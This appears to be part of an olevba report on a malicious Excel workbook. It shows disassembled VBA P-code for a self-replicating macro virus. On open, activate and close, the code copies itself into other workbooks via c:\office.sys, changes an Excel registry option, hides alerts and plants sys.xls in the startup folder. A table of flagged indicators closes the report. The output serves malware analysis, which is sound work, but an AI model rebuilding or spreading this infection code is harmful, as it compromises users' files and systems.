' 	Add 
' 	St ab$ 
' Line #179:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	NextVar 
' Line #180:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Dim "
' 	Ld ab$ 
' 	Concat 
' 	PrintItemNL 
' Line #181:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #182:
' 	EndIfBlock 
' Line #183:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #184:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "End Function"
' 	PrintItemNL 
' Line #185:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #186:
' 	ArgsCall Read 0x0000 
' Line #187:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #188:
' 	LitStr 0x0000 ""
' 	St ab$ 
' Line #189:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #190:
' 	Ld ab$ 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007E 
' 	LitDI2 0x0020 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St ab$ 
' Line #191:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	NextVar 
' Line #192:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0027 
' 	ArgsLd Chr$ 0x0001 
' 	Ld ab$ 
' 	Concat 
' 	PrintItemNL 
' Line #193:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #194:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #195:
' 	ArgsCall Read 0x0000 
' Line #196:
' 	LitStr 0x0000 ""
' 	St aa$ 
' Line #197:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000F 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #198:
' 	Ld aa$ 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St aa$ 
' Line #199:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #200:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Function "
' 	Ld aa$ 
' 	Concat 
' 	LitStr 0x0002 "()"
' 	Concat 
' 	PrintItemNL 
' Line #201:
' 	ArgsCall Read 0x0000 
' Line #202:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0004 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #203:
' 	LitStr 0x0000 ""
' 	St ab$ 
' Line #204:
' 	ArgsCall Read 0x0000 
' Line #205:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000F 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #206:
' 	Ld ab$ 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St ab$ 
' Line #207:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	NextVar 
' Line #208:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld ab$ 
' 	LitStr 0x0002 " ="
' 	Concat 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x7530 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #209:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "End Function"
' 	PrintItemNL 
' Line #211:
' 	EndSelect 
' Line #212:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #213:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #214:
' 	EndFunc 
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 7081 bytes
' Line #0:
' 	Option  (Compare Text)
' 	QuoteRem 0x0014 0x0006 "FRIEND"
' Line #1:
' 	LineCont 0x000C 06 00 00 00 0F 00 00 00 19 00 00 00
' 	FuncDefn (Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #2:
' 	LineCont 0x000C 06 00 00 00 0F 00 00 00 1B 00 00 00
' 	FuncDefn (Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As , ByVal cbData As Long) As Long)
' Line #3:
' 	LineCont 0x0004 06 00 00 00
' 	FuncDefn (Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long)
' Line #4:
' 	Dim (Const) 
' 	LitHI4 0x0001 0x8000 
' 	VarDefn HKEY_CURRENT_USER
' Line #5:
' 	Dim (Const) 
' 	LitHI2 0x003F 
' 	VarDefn KEY_ALL_ACCESS
' Line #6:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn lngData (As Long)
' Line #7:
' 	Dim (Const) 
' 	LitDI2 0x0004 
' 	VarDefn REG_DWORD (As Long)
' Line #8:
' 	FuncDefn (Private Sub Workbook_Activate())
' Line #9:
' 	ArgsCall Infect 0x0000 
' Line #10:
' 	EndSub 
' Line #11:
' 	FuncDefn (Function Infect(id_FFFE As Variant))
' Line #12:
' 	OnError xnctsg 
' Line #13:
' 	LitStr 0x000D "c:\office.sys"
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld Application 
' 	MemLd ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #14:
' 	StartForVariable 
' 	Ld yactgf 
' 	EndForVariable 
' 	Ld VBProject 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	ForEach 
' Line #15:
' 	Ld yactgf 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St xcctsg 
' Line #16:
' 	StartForVariable 
' 	Ld xcctxg 
' 	EndForVariable 
' 	Ld yactgf 
' 	MemLd VBComponents 
' 	ForEach 
' Line #17:
' 	Ld xcctxg 
' 	MemLd New 
' 	St yactxg 
' Line #18:
' 	Ld yactxg 
' 	LitStr 0x000C "ThisWorkbook"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld yactxg 
' 	Ld yactgf 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Le 
' 	IfBlock 
' Line #20:
' 	LitStr 0x000D "c:\office.sys"
' 	Ld yactxg 
' 	Ld yactgf 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #21:
' 	StartWithExpr 
' 	Ld yactxg 
' 	Ld yactgf 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #22:
' 	StartForVariable 
' 	Ld asjjh 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #23:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #24:
' 	StartForVariable 
' 	Ld asjjh 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	EndWith 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld xcctxg 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	LineNum 5 
' 	StartForVariable 
' 	Ld yactgf 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	ExitFunc 
' Line #31:
' 	Label xnctsg 
' Line #32:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI4 0xC471 0x0000 
' 	Eq 
' 	IfBlock 
' Line #33:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #34:
' 	Resume 5 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndFunc 
' Line #37:
' 	FuncDefn (Private Sub Workbook_Open())
' Line #38:
' 	LineCont 0x0008 06 00 00 00 0A 00 00 00
' 	Ld HKEY_CURRENT_USER 
' 	LitStr 0x0033 "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitDI4 0x0000 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld k 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St u 
' Line #39:
' 	Ld k 
' 	LitStr 0x0008 "Options6"
' 	LitDI4 0x0000 0x0000 
' 	Ld REG_DWORD 
' 	Ld lngData 
' 	LitDI2 0x0004 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #40:
' 	Ld k 
' 	ArgsLd RegCloseKey 0x0001 
' 	St u 
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #42:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #43:
' 	StartForVariable 
' 	Ld wbxxc 
' 	EndForVariable 
' 	Ld Workbooks 
' 	ForEach 
' Line #44:
' 	Ld wbxxc 
' 	MemLd New 
' 	LitStr 0x0007 "sys.xls"
' 	Eq 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x0007 "sys.xls"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #45:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #46:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #47:
' 	ExitSub 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld wbxxc 
' 	MemLd New 
' 	LitStr 0x0007 "sys.xls"
' 	Eq 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x0007 "sys.xls"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 99 
' 	EndIf 
' Line #50:
' 	StartForVariable 
' 	Ld wbxxc 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #52:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0008 "\sys.xls"
' 	Concat 
' 	Paren 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #53:
' 	LitVarSpecial (True)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #54:
' 	LineNum 99 
' 	OnError xnctsg 
' Line #55:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x0007 "sys.xls"
' 	Eq 
' 	IfBlock 
' Line #56:
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	LitStr 0x000D "c:\office.sys"
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld Application 
' 	MemLd ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #59:
' 	StartForVariable 
' 	Ld yactgf 
' 	EndForVariable 
' 	Ld VBProject 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	ForEach 
' Line #60:
' 	Ld yactgf 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St xcctsg 
' Line #61:
' 	StartForVariable 
' 	Ld xcctxg 
' 	EndForVariable 
' 	Ld yactgf 
' 	MemLd VBComponents 
' 	ForEach 
' Line #62:
' 	Ld xcctxg 
' 	MemLd New 
' 	St yactxg 
' Line #63:
' 	Ld yactxg 
' 	LitStr 0x000C "ThisWorkbook"
' 	Eq 
' 	IfBlock 
' Line #64:
' 	Ld yactxg 
' 	Ld yactgf 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Le 
' 	IfBlock 
' Line #65:
' 	LitStr 0x000D "c:\office.sys"
' 	Ld yactxg 
' 	Ld yactgf 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #66:
' 	StartWithExpr 
' 	Ld yactxg 
' 	Ld yactgf 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #67:
' 	StartForVariable 
' 	Ld asjjh 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #68:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #69:
' 	StartForVariable 
' 	Ld asjjh 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	EndWith 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Ld xcctxg 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	LineNum 5 
' 	StartForVariable 
' 	Ld yactgf 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' 	LitVarSpecial (True)
' 	ParamNamed savechanges 
' 	LitStr 0x0007 "sys.xls"
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #76:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #77:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #78:
' 	ExitSub 
' Line #79:
' 	Label xnctsg 
' Line #80:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI4 0xC471 0x0000 
' 	Eq 
' 	IfBlock 
' Line #81:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #82:
' 	Resume 5 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Private Sub Workbook_BeforeClose(Cancel As Boolean))
' Line #86:
' 	LineCont 0x0008 06 00 00 00 0A 00 00 00
' 	Ld HKEY_CURRENT_USER 
' 	LitStr 0x0033 "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitDI4 0x0000 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld k 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St u 
' Line #87:
' 	Ld k 
' 	LitStr 0x0008 "Options6"
' 	LitDI4 0x0000 0x0000 
' 	Ld REG_DWORD 
' 	Ld lngData 
' 	LitDI2 0x0004 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #88:
' 	Ld k 
' 	ArgsLd RegCloseKey 0x0001 
' 	St u 
' Line #89:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x0007 "sys.xls"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #90:
' 	ArgsCall Infect 0x0000 
' Line #91:
' 	EndSub 
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' _VBA_PROJECT_CUR/VBA/List1 - 956 bytes
' _VBA_PROJECT_CUR/VBA/List2 - 956 bytes
' _VBA_PROJECT_CUR/VBA/List3 - 956 bytes
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Activate   |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |VBProject.VBE       |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

